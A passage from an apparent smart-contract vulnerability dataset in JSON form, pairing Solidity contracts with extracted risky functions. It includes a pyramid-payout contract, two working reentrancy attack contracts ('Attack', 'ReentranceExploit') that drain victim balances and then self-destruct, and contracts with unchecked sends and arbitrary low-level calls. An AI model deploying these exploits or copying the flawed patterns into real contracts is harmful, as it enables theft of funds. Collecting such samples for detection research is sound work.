{\n collectedFees = 0;\n }\n }\n }\n function totalParticipants() constant returns (uint count) {\n count = participants.length;\n }\n function awaitingParticipants() constant returns (uint count) {\n count = participants.length - payoutOrder;\n }\n function outstandingBalance() constant returns (uint amount) {\n uint payout = 0;\n uint idx;\n for (idx = payoutOrder; idx < participants.length; idx++) {\n payout += participants[idx].payout;\n }\n amount = payout - balance;\n }\n function setOwner(address _owner) onlyowner {\n owner = _owner;\n }\n}",
  "extract_feature": [
    "function enter() {\nif (msg.value < minAmount) {\ncollectedFees += msg.value;\nreturn;\n}\nuint amount;\nif (msg.value > maxAmount) {\nuint amountToRefund = msg.value - maxAmount;\nif (amountToRefund >= minAmount) {\nif (!msg.sender.send(amountToRefund)) {\nthrow;\n}\n}\namount = maxAmount;\n}\nelse {\namount = msg.value;\n}\nparticipants.push(Participant(\nmsg.sender,\namount * pyramidMultiplier / 100\n));\nbalance += (amount * (100 - fee)) / 100;\ncollectedFees += (amount * fee) / 100;\nwhile (balance > participants[payoutOrder].payout) {\nuint payoutToSend = participants[payoutOrder].payout;\nparticipants[payoutOrder].etherAddress.send(payoutToSend);\nbalance -= payoutToSend;\npayoutOrder += 1;\n}\nif (collectedFees >= minFeePayout) {\nif (!owner.send(collectedFees)) {\nif (owner.call.gas(msg.gas).value(collectedFees)()) {\ncollectedFees = 0;\n}\n} else {\ncollectedFees = 0;\n}\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1648"
  },
  "filename": "40733.sol",
  "content": "contract Attack {\n address owner;\n address victim;\n function Attack() payable { owner = msg.sender; }\n function setVictim(address target) { victim = target; }\n function step1(uint256 amount) payable {\n if (this.balance >= amount) {\n victim.call.value(amount)(bytes4(keccak256(\"Deposit()\")));\n }\n }\n function step2(uint256 amount) {\n victim.call(bytes4(keccak256(\"CashOut(uint256)\")), amount);\n }\n function stopAttack() {\n selfdestruct(owner);\n }\n function startAttack(uint256 amount) {\n step1(amount);\n step2(amount / 2);\n }\n function () payable {\n victim.call(bytes4(keccak256(\"CashOut(uint256)\")), msg.value);\n }\n}",
  "extract_feature": [
    "function step2(uint256 amount) {\nvictim.call(bytes4(keccak256(\"CashOut(uint256)\")), amount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1649"
  },
  "filename": "40743.sol",
  "content": "pragma solidity ^0.4.15;\ncontract ReentranceExploit {\n bool public attackModeIsOn=false;\n address public vulnerable_contract;\n address public owner;\n function ReentranceExploit() public{\n owner = msg.sender;\n }\n function deposit(address _vulnerable_contract) public payable{\n vulnerable_contract = _vulnerable_contract ;\n require(vulnerable_contract.call.value(msg.value)(bytes4(sha3(\"addToBalance()\"))));\n }\n function launch_attack() public{\n attackModeIsOn = true;\n require(vulnerable_contract.call(bytes4(sha3(\"withdrawBalance()\"))));\n }\n function () public payable{\n if (attackModeIsOn){\n attackModeIsOn = false;\n require(vulnerable_contract.call(bytes4(sha3(\"withdrawBalance()\"))));\n }\n }\n function get_money(){\n suicide(owner);\n }\n}",
  "extract_feature": [
    "function launch_attack() public{\nattackModeIsOn = true;\nrequire(vulnerable_contract.call(bytes4(sha3(\"withdrawBalance()\"))));\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb164a"
  },
  "filename": "43012.sol",
  "content": "pragma solidity ^0.4.18;\nimport \"./SecurityTransferAgentInterface.sol\";\nimport \"./ERC677Token.sol\";\nimport \"zeppelin/contracts/math/SafeMath.sol\";\ncontract CheckpointToken is ERC677Token {\n using SafeMath for uint256;\n string public name;\n string public symbol;\n uint256 public decimals;\n SecurityTransferAgent public transactionVerifier;\n struct Checkpoint {\n uint256 checkpointID;\n uint256 value;\n }\n mapping (address => Checkpoint[]) public tokenBalances;\n Checkpoint[] public tokensTotal;\n uint256 public currentCheckpointID;\n mapping (address => mapping (address => uint256)) public allowed;\n function CheckpointToken(string _name, string _symbol, uint256 _decimals) public {\n name = _name;\n symbol = _symbol;\n decimals = _decimals;\n }\n function allowance(address owner, address spender) public view returns (uint256) {\n return allowed[owner][spender];\n }\n function approve(address spender, uint256 value) public returns (bool) {\n allowed[msg.sender][spender] = value;\n Approval(msg.sender, spender, value);\n return true;\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool) {\n require(value <= allowed[from][msg.sender]);\n value = verifyTransaction(from, to, value);\n transferInternal(from, to, value);\n Transfer(from, to, value);\n return true;\n }\n function transfer(address to, uint256 value) public returns (bool) {\n value = verifyTransaction(msg.sender, to, value);\n transferInternal(msg.sender, to, value);\n Transfer(msg.sender, to, value);\n return true;\n }\n function totalSupply() public view returns (uint256 tokenCount) {\n tokenCount = balanceAtCheckpoint(tokensTotal, currentCheckpointID);\n }\n function totalSupplyAt(uint256 checkpointID) public view returns (uint256 tokenCount) {\n tokenCount = balanceAtCheckpoint(tokensTotal, checkpointID);\n }\n function balanceOf(address owner) public view returns (uint256 balance) {\n balance = balanceAtCheckpoint(tokenBalances[owner], currentCheckpointID);\n }\n function balanceAt(address owner, uint256 checkpointID) public view returns (uint256 balance) {\n balance = balanceAtCheckpoint(tokenBalances[owner], checkpointID);\n }\n function increaseApproval(address spender, uint addedValue) public returns (bool) {\n allowed[msg.sender][spender] = allowed[msg.sender][spender].add(addedValue);\n Approval(msg.sender, spender, allowed[msg.sender][spender]);\n return true;\n }\n function decreaseApproval(address spender, uint subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][spender];\n if (subtractedValue > oldValue) {\n allowed[msg.sender][spender] = 0;\n } else {\n allowed[msg.sender][spender] = oldValue.sub(subtractedValue);\n }\n Approval(msg.sender, spender, allowed[msg.sender][spender]);\n return true;\n }\n function increaseApproval(address spender, uint addedValue, bytes data) public returns (bool) {\n require(spender != address(this));\n increaseApproval(spender, addedValue);\n require(spender.call(data));\n return true;\n }\n function decreaseApproval(address spender, uint subtractedValue, bytes data) public returns (bool) {\n require(spender != address(this));\n decreaseApproval(spender, subtractedValue);\n require(spender.call(data));\n return true;\n }\n function balanceAtCheckpoint(Checkpoint[] storage checkpoints, uint256 checkpointID) internal returns (uint256 balance) {\n uint256 currentCheckpointID;\n (currentCheckpointID, balance) = getCheckpoint(checkpoints, checkpointID);\n }\n function verifyTransaction(address from, address to, uint256 value) internal returns (uint256) {\n if (address(transactionVerifier) != address(0)) {\n value = transactionVerifier.verify(from, to, value);\n }\n return value;\n }\n function transferInternal(address from, address to, uint256 value) internal {\n uint256 fromBalance = balanceOf(from);\n uint256 toBalance = balanceOf(to);\n setCheckpoint(tokenBalances[from], fromBalance.sub(value));\n setCheckpoint(tokenBalances[to], toBalance.add(value));\n }\n function createCheckpoint() internal returns (uint256 checkpointID) {\n currentCheckpointID = currentCheckpointID + 1;\n return currentCheckpointID;\n }\n function setCheckpoint(Checkpoint[] storage checkpoints, uint256 newValue) internal {\n if ((checkpoints.length == 0) || (checkpoints[checkpoints.length.sub(1)].checkpointID < currentCheckpointID)) {\n checkpoints.push(Checkpoint(currentCheckpointID, newValue));\n } else {\n checkpoints[checkpoints.length.sub(1)] = Checkpoint(currentCheckpointID, newValue);\n }\n }\n function getCheckpoint(Checkpoint[] storage checkpoints, uint256 checkpointID) internal returns (uint256 checkpointID_, uint256 value) {\n if (checkpoints.length == 0) {\n return (0, 0);\n }\n if (checkpointID >= checkpoints[checkpoints.length.sub(1)].checkpointID) {\n return (checkpoints[checkpoints.length.sub(1)].checkpointID, checkpoints[checkpoints.length.sub(1)].value);\n }\n if (checkpointID < checkpoints[0].checkpointID) {\n return (0, 0);\n }\n uint256 min = 0;\n uint256 max = checkpoints.length.sub(1);\n while (max > min) {\n uint256 mid = (max.add(min.add(1))).div(2);\n if (checkpoints[mid].checkpointID <= checkpointID) {\n min = mid;\n } else {\n max = mid.sub(1);\n }\n }\n return (checkpoints[min].checkpointID, checkpoints[min].value);\n }\n}",
  "extract_feature": [
    "function increaseApproval(address spender, uint addedValue, bytes data) public returns (bool) {\nrequire(spender != address(this));\nincreaseApproval(spender, addedValue);\nrequire(spender.call(data));\nreturn true;\n}",
    "function decreaseApproval(address spender, uint subtractedValue, bytes data) public returns (bool) {\nrequire(spender != address(this));\ndecreaseApproval(spender, subtractedValue);\nrequire(spender.call(data));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb164b"
  },
  "filename": "43074.sol",
  "content": "pragma solidity ^0.4.26;\nimport \"@kleros/kleros-interaction/contracts/standard/arbitration/Arbitrable.sol\";\nimport \"@kleros/kleros-interaction/contracts/libraries/CappedMath.sol\";\ncontract KlerosGovernor is Arbitrable {\n using CappedMath for uint;\n enum Status { NoDispute, DisputeCreated, Resolved }\n struct Session {\n Round[] rounds;\n uint ruling;\n uint disputeID;\n uint[] submittedLists;\n uint sumDeposit;\n Status status;\n mapping(bytes32 => bool) alreadySubmitted;\n uint durationOffset;\n }\n struct Transaction {\n address target;\n uint value;\n bytes data;\n bool executed;\n }\n struct Submission {\n address submitter;\n uint deposit;\n Transaction[] txs;\n bytes32 listHash;\n uint submissionTime;\n bool approved;\n uint approvalTime;\n }\n struct Round {\n mapping (uint => uint) paidFees;\n mapping (uint => bool) hasPaid;\n uint feeRewards;\n mapping(address => mapping (uint => uint)) contributions;\n uint successfullyPaid;\n }\n uint constant NO_SHADOW_WINNER = uint(-1);\n address public deployer;\n uint public reservedETH;\n uint public submissionBaseDeposit;\n uint public submissionTimeout;\n uint public executionTimeout;\n uint public withdrawTimeout;\n uint public sharedMultiplier;\n uint public winnerMultiplier;\n uint public loserMultiplier;\n uint public constant MULTIPLIER_DIVISOR = 10000;\n uint public lastApprovalTime;\n uint public shadowWinner;\n uint public metaEvidenceUpdates;\n Submission[] public submissions;\n Session[] public sessions;\n modifier duringSubmissionPeriod() {\n uint offset = sessions[sessions.length - 1].durationOffset;\n require(now - lastApprovalTime <= submissionTimeout.addCap(offset), \"Submission time has ended.\");\n _;\n }\n modifier duringApprovalPeriod() {\n uint offset = sessions[sessions.length - 1].durationOffset;\n require(now - lastApprovalTime > submissionTimeout.addCap(offset), \"Approval time has not started yet.\");\n _;\n }\n modifier onlyByGovernor() {require(address(this) == msg.sender, \"Only the governor can execute this.\"); _;}\n event ListSubmitted(uint indexed _listID, address indexed _submitter, uint indexed _session, string _description);\n constructor (\n Arbitrator _arbitrator,\n bytes _extraData,\n uint _submissionBaseDeposit,\n uint _submissionTimeout,\n uint _executionTimeout,\n uint _withdrawTimeout,\n uint _sharedMultiplier,\n uint _winnerMultiplier,\n uint _loserMultiplier\n ) public Arbitrable(_arbitrator, _extraData) {\n lastApprovalTime = now;\n submissionBaseDeposit = _submissionBaseDeposit;\n submissionTimeout = _submissionTimeout;\n executionTimeout = _executionTimeout;\n withdrawTimeout = _withdrawTimeout;\n sharedMultiplier = _sharedMultiplier;\n winnerMultiplier = _winnerMultiplier;\n loserMultiplier = _loserMultiplier;\n shadowWinner = NO_SHADOW_WINNER;\n sessions.length++;\n deployer = msg.sender;\n }\n function setMetaEvidence(string _metaEvidence) external {\n require(msg.sender == deployer, \"Can only be called once by the deployer of the contract.\");\n deployer = address(0);\n emit MetaEvidence(metaEvidenceUpdates, _metaEvidence);\n }\n function changeSubmissionDeposit(uint _submissionBaseDeposit) public onlyByGovernor {\n submissionBaseDeposit = _submissionBaseDeposit;\n }\n function changeSubmissionTimeout(uint _submissionTimeout) public onlyByGovernor duringSubmissionPeriod {\n submissionTimeout = _submissionTimeout;\n }\n function changeExecutionTimeout(uint _executionTimeout) public onlyByGovernor {\n executionTimeout = _executionTimeout;\n }\n function changeWithdrawTimeout(uint _withdrawTimeout) public onlyByGovernor {\n withdrawTimeout = _withdrawTimeout;\n }\n function changeSharedMultiplier(uint _sharedMultiplier) public onlyByGovernor {\n sharedMultiplier = _sharedMultiplier;\n }\n function changeWinnerMultiplier(uint _winnerMultiplier) public onlyByGovernor {\n winnerMultiplier = _winnerMultiplier;\n }\n function changeLoserMultiplier(uint _loserMultiplier) public onlyByGovernor {\n loserMultiplier = _loserMultiplier;\n }\n function changeArbitrator(Arbitrator _arbitrator, bytes _arbitratorExtraData) public onlyByGovernor duringSubmissionPeriod {\n arbitrator = _arbitrator;\n arbitratorExtraData = _arbitratorExtraData;\n }\n function changeMetaEvidence(string _metaEvidence) public onlyByGovernor {\n require(deployer == address(0), \"Metaevidence was not set.\");\n metaEvidenceUpdates++;\n emit MetaEvidence(metaEvidenceUpdates, _metaEvidence);\n }\n function submitList (address[] _target, uint[] _value, bytes _data, uint[] _dataSize, string _description) public payable duringSubmissionPeriod {\n require(_target.length == _value.length, \"Incorrect input. Target and value arrays must be of the same length.\");\n require(_target.length == _dataSize.length, \"Incorrect input. Target and datasize arrays must be of the same length.\");\n Session storage session = sessions[sessions.length - 1];\n Submission storage submission = submissions[submissions.length++];\n submission.submitter = msg.sender;\n submission.deposit = submissionBaseDeposit + arbitrator.arbitrationCost(arbitratorExtraData);\n require(msg.value >= submission.deposit, \"Submission deposit must be paid in full.\");\n bytes32[3] memory hashes;\n uint readingPosition;\n for (uint i = 0; i < _target.length; i++) {\n bytes memory readData = new bytes(_dataSize[i]);\n Transaction storage transaction = submission.txs[submission.txs.length++];\n transaction.target = _target[i];\n transaction.value = _value[i];\n for (uint j = 0; j < _dataSize[i]; j++) {\n readData[j] = _data[readingPosition + j];\n }\n transaction.data = readData;\n readingPosition += _dataSize[i];\n hashes[2] = keccak256(abi.encodePacked(transaction.target, transaction.value, transaction.data));\n require(uint(hashes[2]) >= uint(hashes[1]), \"The transactions are in incorrect order.\");\n hashes[0] = keccak256(abi.encodePacked(hashes[2], hashes[0]));\n hashes[1] = hashes[2];\n }\n require(!session.alreadySubmitted[hashes[0]], \"The same list was already submitted earlier.\");\n session.alreadySubmitted[hashes[0]] = true;\n submission.listHash = hashes[0];\n submission.submissionTime = now;\n session.sumDeposit += submission.deposit;\n session.submittedLists.push(submissions.length - 1);\n if (session.submittedLists.length == 1)\n session.durationOffset = now.subCap(lastApprovalTime);\n emit ListSubmitted(submissions.length - 1, msg.sender, sessions.length - 1, _description);\n uint remainder = msg.value - submission.deposit;\n if (remainder > 0)\n msg.sender.send(remainder);\n reservedETH += submission.deposit;\n }\n function withdrawTransactionList(uint _submissionID, bytes32 _listHash) public {\n Session storage session = sessions[sessions.length - 1];\n Submission storage submission = submissions[session.submittedLists[_submissionID]];\n require(now - lastApprovalTime <= submissionTimeout / 2, \"Lists can be withdrawn only in the first half of the period.\");\n require(submission.listHash == _listHash, \"Provided hash doesn't correspond with submission ID.\");\n require(submission.submitter == msg.sender, \"Can't withdraw the list created by someone else.\");\n require(now - submission.submissionTime <= withdrawTimeout, \"Withdrawing time has passed.\");\n session.submittedLists[_submissionID] = session.submittedLists[session.submittedLists.length - 1];\n session.alreadySubmitted[_listHash] = false;\n session.submittedLists.length--;\n session.sumDeposit = session.sumDeposit.subCap(submission.deposit);\n msg.sender.transfer(submission.deposit);\n reservedETH = reservedETH.subCap(submission.deposit);\n }\n function executeSubmissions() public duringApprovalPeriod {\n Session storage session = sessions[sessions.length - 1];\n require(session.status == Status.NoDispute, \"Can't approve transaction list while dispute is active.\");\n if (session.submittedLists.length == 0) {\n lastApprovalTime = now;\n session.status = Status.Resolved;\n sessions.length++;\n } else if (session.submittedLists.length == 1) {\n Submission storage submission = submissions[session.submittedLists[0]];\n submission.approved = true;\n submission.approvalTime = now;\n uint sumDeposit = session.sumDeposit;\n session.sumDeposit = 0;\n submission.submitter.send(sumDeposit);\n lastApprovalTime = now;\n session.status = Status.Resolved;\n sessions.length++;\n reservedETH = reservedETH.subCap(sumDeposit);\n } else {\n session.status = Status.DisputeCreated;\n uint arbitrationCost = arbitrator.arbitrationCost(arbitratorExtraData);\n session.disputeID = arbitrator.createDispute.value(arbitrationCost)(session.submittedLists.length, arbitratorExtraData);\n session.rounds.length++;\n session.sumDeposit = session.sumDeposit.subCap(arbitrationCost);\n reservedETH = reservedETH.subCap(arbitrationCost);\n emit Dispute(arbitrator, session.disputeID, metaEvidenceUpdates, sessions.length - 1);\n }\n }\n function fundAppeal(uint _submissionID) public payable {\n Session storage session = sessions[sessions.length - 1];\n require(_submissionID <= session.submittedLists.length - 1, \"SubmissionID is out of bounds.\");\n require(session.status == Status.DisputeCreated, \"No dispute to appeal.\");\n require(arbitrator.disputeStatus(session.disputeID) == Arbitrator.DisputeStatus.Appealable, \"Dispute is not appealable.\");\n (uint appealPeriodStart, uint appealPeriodEnd) = arbitrator.appealPeriod(session.disputeID);\n require(\n now >= appealPeriodStart && now < appealPeriodEnd,\n \"Appeal fees must be paid within the appeal period.\"\n );\n uint winner = arbitrator.currentRuling(session.disputeID);\n uint multiplier;\n if (winner == _submissionID + 1) {\n multiplier = winnerMultiplier;\n } else if (winner == 0) {\n multiplier = sharedMultiplier;\n } else {\n require(now - appealPeriodStart < (appealPeriodEnd - appealPeriodStart)/2, \"The loser must pay during the first half of the appeal period.\");\n multiplier = loserMultiplier;\n }\n Round storage round = session.rounds[session.rounds.length - 1];\n require(!round.hasPaid[_submissionID], \"Appeal fee has already been paid.\");\n uint appealCost = arbitrator.appealCost(session.disputeID, arbitratorExtraData);\n uint totalCost = appealCost.addCap((appealCost.mulCap(multiplier)) / MULTIPLIER_DIVISOR);\n uint contribution;\n uint remainingETH;\n (contribution, remainingETH) = calculateContribution(msg.value, totalCost.subCap(round.paidFees[_submissionID]));\n round.contributions[msg.sender][_submissionID] += contribution;\n round.paidFees[_submissionID] += contribution;\n if (round.paidFees[_submissionID] >= totalCost) {\n round.hasPaid[_submissionID] = true;\n if (shadowWinner == NO_SHADOW_WINNER)\n shadowWinner = _submissionID;\n round.feeRewards += round.paidFees[_submissionID];\n round.successfullyPaid += round.paidFees[_submissionID];\n }\n msg.sender.send(remainingETH);\n reservedETH += contribution;\n if (shadowWinner != NO_SHADOW_WINNER && shadowWinner != _submissionID && round.hasPaid[_submissionID]) {\n shadowWinner = NO_SHADOW_WINNER;\n arbitrator.appeal.value(appealCost)(session.disputeID, arbitratorExtraData);\n session.rounds.length++;\n round.feeRewards = round.feeRewards.subCap(appealCost);\n reservedETH = reservedETH.subCap(appealCost);\n }\n }\n function calculateContribution(uint _available, uint _requiredAmount)\n internal\n pure\n returns(uint taken, uint remainder)\n {\n if (_requiredAmount > _available)\n taken = _available;\n else {\n taken = _requiredAmount;\n remainder = _available - _requiredAmount;\n }\n }\n function withdrawFeesAndRewards(address _beneficiary, uint _session, uint _round, uint _submissionID) public {\n Session storage session = sessions[_session];\n Round storage round = session.rounds[_round];\n require(session.status == Status.Resolved, \"Session has an ongoing dispute.\");\n uint reward;\n if (!round.hasPaid[_submissionID]) {\n reward = round.contributions[_beneficiary][_submissionID];\n } else if (session.ruling == 0 || !round.hasPaid[session.ruling - 1]) {\n reward = round.successfullyPaid > 0\n ? (round.contributions[_beneficiary][_submissionID] * round.feeRewards) / round.successfullyPaid\n : 0;\n } else if (session.ruling - 1 == _submissionID) {\n reward = round.paidFees[_submissionID] > 0\n ? (round.contributions[_beneficiary][_submissionID] * round.feeRewards) / round.paidFees[_submissionID]\n : 0;\n }\n round.contributions[_beneficiary][_submissionID] = 0;\n _beneficiary.send(reward);\n reservedETH = reservedETH.subCap(reward);\n }\n function rule(uint _disputeID, uint _ruling) public {\n Session storage session = sessions[sessions.length - 1];\n require(msg.sender == address(arbitrator), \"Must be called by the arbitrator.\");\n require(session.status == Status.DisputeCreated, \"The dispute has already been resolved.\");\n require(_ruling <= session.submittedLists.length, \"Ruling is out of bounds.\");\n if (shadowWinner != NO_SHADOW_WINNER) {\n emit Ruling(Arbitrator(msg.sender), _disputeID, shadowWinner + 1);\n executeRuling(_disputeID, shadowWinner + 1);\n } else {\n emit Ruling(Arbitrator(msg.sender), _disputeID, _ruling);\n executeRuling(_disputeID, _ruling);\n }\n }\n function submitEvidence(string _evidenceURI) public {\n if (bytes(_evidenceURI).length > 0)\n emit Evidence(arbitrator, sessions.length - 1, msg.sender, _evidenceURI);\n }\n function executeRuling(uint _disputeID, uint _ruling) internal {\n Session storage session = sessions[sessions.length - 1];\n if (_ruling != 0) {\n Submission storage submission = submissions[session.submittedLists[_ruling - 1]];\n submission.approved = true;\n submission.approvalTime = now;\n submission.submitter.send(session.sumDeposit);\n }\n reservedETH = reservedETH.subCap(session.sumDeposit);\n session.sumDeposit = 0;\n shadowWinner = NO_SHADOW_WINNER;\n lastApprovalTime = now;\n session.status = Status.Resolved;\n session.ruling = _ruling;\n sessions.length++;\n }\n function executeTransactionList(uint _listID, uint _cursor, uint _count) public {\n Submission storage submission = submissions[_listID];\n require(submission.approved, \"Can't execute list that wasn't approved.\");\n require(now - submission.approvalTime <= executionTimeout, \"Time to execute the transaction list has passed.\");\n for (uint i = _cursor; i < submission.txs.length && (_count == 0 || i < _cursor + _count); i++) {\n Transaction storage transaction = submission.txs[i];\n uint expendableFunds = getExpendableFunds();\n if (!transaction.executed && transaction.value <= expendableFunds) {\n bool callResult = transaction.target.call.value(transaction.value)(transaction.data);\n if (callResult == true) {\n require(!transaction.executed, \"This transaction has already been executed.\");\n transaction.executed = true;\n }\n }\n }\n }\n function () public payable {}\n function getExpendableFunds() public view returns (uint) {\n return address(this).balance.subCap(reservedETH);\n }\n function getTransactionInfo(uint _listID, uint _transactionIndex)\n public\n view\n returns (\n address target,\n uint value,\n bytes data,\n bool executed\n )\n {\n Submission storage submission = submissions[_listID];\n Transaction storage transaction = submission.txs[_transactionIndex];\n return (\n transaction.target,\n transaction.value,\n transaction.data,\n transaction.executed\n );\n }\n function getContributions(\n uint _session,\n uint _round,\n address _contributor\n ) public view returns(uint[] contributions) {\n Session storage session = sessions[_session];\n Round storage round = session.rounds[_round];\n contributions = new uint[](session.submittedLists.length);\n for (uint i = 0; i < contributions.length; i++) {\n contributions[i] = round.contributions[_contributor][i];\n }\n }\n function getRoundInfo(uint _session, uint _round)\n public\n view\n returns (\n uint[] paidFees,\n bool[] hasPaid,\n uint feeRewards,\n uint successfullyPaid\n )\n {\n Session storage session = sessions[_session];\n Round storage round = session.rounds[_round];\n paidFees = new uint[](session.submittedLists.length);\n hasPaid = new bool[](session.submittedLists.length);\n for (uint i = 0; i < session.submittedLists.length; i++) {\n paidFees[i] = round.paidFees[i];\n hasPaid[i] = round.hasPaid[i];\n }\n feeRewards = round.feeRewards;\n successfullyPaid = round.successfullyPaid;\n }\n function getSubmittedLists(uint _session) public view returns (uint[] submittedLists) {\n Session storage session = sessions[_session];\n submittedLists = session.submittedLists;\n }\n function getNumberOfTransactions(uint _listID) public view returns (uint txCount) {\n Submission storage submission = submissions[_listID];\n return submission.txs.length;\n }\n function getNumberOfCreatedLists() public view returns (uint) {\n return submissions.length;\n }\n function getCurrentSessionNumber() public view returns (uint) {\n return sessions.length - 1;\n }\n function getSessionRoundsNumber(uint _session) public view returns (uint) {\n Session storage session = sessions[_session];\n return session.rounds.length;\n }\n}",
  "extract_feature": [
    "function submitList (address[] _target, uint[] _value, bytes _data, uint[] _dataSize, string _description) public payable duringSubmissionPeriod {\nrequire(_target.length == _value.length, \"Incorrect input. Target and value arrays must be of the same length.\");\nrequire(_target.length == _dataSize.length, \"Incorrect input. Target and datasize arrays must be of the same length.\");\nSession storage session = sessions[sessions.length - 1];\nSubmission storage submission = submissions[submissions.length++];\nsubmission.submitter = msg.sender;\nsubmission.deposit = submissionBaseDeposit + arbitrator.arbitrationCost(arbitratorExtraData);\nrequire(msg.value >= submission.deposit, \"Submission deposit must be paid in full.\");\nbytes32[3] memory hashes;\nuint readingPosition;\nfor (uint i = 0; i < _target.length; i++) {\nbytes memory readData = new bytes(_dataSize[i]);\nTransaction storage transaction = submission.txs[submission.txs.length++];\ntransaction.target = _target[i];\ntransaction.value = _value[i];\nfor (uint j = 0; j < _dataSize[i]; j++) {\nreadData[j] = _data[readingPosition + j];\n}\ntransaction.data = readData;\nreadingPosition += _dataSize[i];\nhashes[2] = keccak256(abi.encodePacked(transaction.target, transaction.value, transaction.data));\nrequire(uint(hashes[2]) >= uint(hashes[1]), \"The transactions are in incorrect order.\");\nhashes[0] = keccak256(abi.encodePacked(hashes[2], hashes[0]));\nhashes[1] = hashes[2];\n}\nrequire(!session.alreadySubmitted[hashes[0]], \"The same list was already submitted earlier.\");\nsession.alreadySubmitted[hashes[0]] = true;\nsubmission.listHash = hashes[0];\nsubmission.submissionTime = now;\nsession.sumDeposit += submission.deposit;\nsession.submittedLists.push(submissions.length - 1);\nif (session.submittedLists.length == 1)\nsession.durationOffset = now.subCap(lastApprovalTime);\nemit ListSubmitted(submissions.length - 1, msg.sender, sessions.length - 1, _description);\nuint remainder = msg.value - submission.deposit;\nif (remainder > 0)\nmsg.sender.send(remainder);\nreservedETH += submission.deposit;\n}",
    "function executeSubmissions() public duringApprovalPeriod {\nSession storage session = sessions[sessions.length - 1];\nrequire(session.status == Status.NoDispute, \"Can't approve transaction list while dispute is active.\");\nif (session.submittedLists.length == 0) {\nlastApprovalTime = now;\nsession.status = Status.Resolved;\nsessions.length++;\n} else if (session.submittedLists.length == 1) {\nSubmission storage submission = submissions[session.submittedLists[0]];\nsubmission.approved = true;\nsubmission.approvalTime = now;\nuint sumDeposit = session.sumDeposit;\nsession.sumDeposit = 0;\nsubmission.submitter.send(sumDeposit);\nlastApprovalTime = now;\nsession.status = Status.Resolved;\nsessions.length++;\nreservedETH = reservedETH.subCap(sumDeposit);\n} else {\nsession.status = Status.DisputeCreated;\nuint arbitrationCost = arbitrator.arbitrationCost(arbitratorExtraData);\nsession.disputeID = arbitrator.createDispute.value(arbitrationCost)(session.submittedLists.length, arbitratorExtraData);\nsession.rounds.length++;\nsession.sumDeposit = session.sumDeposit.subCap(arbitrationCost);\nreservedETH = reservedETH.subCap(arbitrationCost);\nemit Dispute(arbitrator, session.disputeID, metaEvidenceUpdates, sessions.length - 1);\n}\n}",
    "function fundAppeal(uint _submissionID) public payable {\nSession storage session = sessions[sessions.length - 1];\nrequire(_submissionID <= session.submittedLists.length - 1, \"SubmissionID is out of bounds.\");\nrequire(session.status == Status.DisputeCreated, \"No dispute to appeal.\");\nrequire(arbitrator.disputeStatus(session.disputeID) == Arbitrator.DisputeStatus.Appealable, \"Dispute is not appealable.\");\n(uint appealPeriodStart, uint appealPeriodEnd) = arbitrator.appealPeriod(session.disputeID);\nrequire(\nnow >= appealPeriodStart && now < appealPeriodEnd,\n\"Appeal fees must be paid within the appeal period.\"\n);\nuint winner = arbitrator.currentRuling(session.disputeID);\nuint multiplier;\nif (winner == _submissionID + 1) {\nmultiplier = winnerMultiplier;\n} else if (winner == 0) {\nmultiplier = sharedMultiplier;\n} else {\nrequire(now - appealPeriodStart < (appealPeriodEnd - appealPeriodStart)/2, \"The loser must pay during the first half of the appeal period.\");\nmultiplier = loserMultiplier;\n}\nRound storage round = session.rounds[session.rounds.length - 1];\nrequire(!round.hasPaid[_submissionID], \"Appeal fee has already been paid.\");\nuint appealCost = arbitrator.appealCost(session.disputeID, arbitratorExtraData);\nuint totalCost = appealCost.addCap((appealCost.mulCap(multiplier)) / MULTIPLIER_DIVISOR);\nuint contribution;\nuint remainingETH;\n(contribution, remainingETH) = calculateContribution(msg.value, totalCost.subCap(round.paidFees[_submissionID]));\nround.contributions[msg.sender][_submissionID] += contribution;\nround.paidFees[_submissionID] += contribution;\nif (round.paidFees[_submissionID] >= totalCost) {\nround.hasPaid[_submissionID] = true;\nif (shadowWinner == NO_SHADOW_WINNER)\nshadowWinner = _submissionID;\nround.feeRewards += round.paidFees[_submissionID];\nround.successfullyPaid += round.paidFees[_submissionID];\n}\nmsg.sender.send(remainingETH);\nreservedETH += contribution;\nif (shadowWinner != NO_SHADOW_WINNER && shadowWinner != _submissionID && round.hasPaid[_submissionID]) {\nshadowWinner = NO_SHADOW_WINNER;\narbitrator.appeal.value(appealCost)(session.disputeID, arbitratorExtraData);\nsession.rounds.length++;\nround.feeRewards = round.feeRewards.subCap(appealCost);\nreservedETH = reservedETH.subCap(appealCost);\n}\n}",
    "function withdrawFeesAndRewards(address _beneficiary, uint _session, uint _round, uint _submissionID) public {\nSession storage session = sessions[_session];\nRound storage round = session.rounds[_round];\nrequire(session.status == Status.Resolved, \"Session has an ongoing dispute.\");\nuint reward;\nif (!round.hasPaid[_submissionID]) {\nreward = round.contributions[_beneficiary][_submissionID];\n} else if (session.ruling == 0 || !round.hasPaid[session.ruling - 1]) {\nreward = round.successfullyPaid > 0\n? (round.contributions[_beneficiary][_submissionID] * round.feeRewards) / round.successfullyPaid\n: 0;\n} else if (session.ruling - 1 == _submissionID) {\nreward = round.paidFees[_submissionID] > 0\n? (round.contributions[_beneficiary][_submissionID] * round.feeRewards) / round.paidFees[_submissionID]\n: 0;\n}\nround.contributions[_beneficiary][_submissionID] = 0;\n_beneficiary.send(reward);\nreservedETH = reservedETH.subCap(reward);\n}",
    "function executeRuling(uint _disputeID, uint _ruling) internal {\nSession storage session = sessions[sessions.length - 1];\nif (_ruling != 0) {\nSubmission storage submission = submissions[session.submittedLists[_ruling - 1]];\nsubmission.approved = true;\nsubmission.approvalTime = now;\nsubmission.submitter.send(session.sumDeposit);\n}\nreservedETH = reservedETH.subCap(session.sumDeposit);\nsession.sumDeposit = 0;\nshadowWinner = NO_SHADOW_WINNER;\nlastApprovalTime = now;\nsession.status = Status.Resolved;\nsession.ruling = _ruling;\nsessions.length++;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb164c"
  },
  "filename": "43413.sol",
